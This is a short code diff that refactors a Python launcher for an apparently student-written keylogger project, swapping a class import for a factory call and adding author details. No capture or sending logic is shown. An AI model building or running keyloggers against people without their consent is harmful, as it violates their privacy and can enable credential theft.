@@ -1,8 +1,16 @@
-from keylogger.keylogger import KeyLogger
+"""
+
+"""
+
+__author__ = "Nathaniel Cotton"
+__email__ = "nec2887@rit.edu"
+
+import keylogger.model as kl
+
 
 def main():
-    kl = KeyLogger()
-    kl.start()
+    keylogger = kl.getKeyLogger()
+    keylogger.start()
 
 
 if __name__ == '__main__':
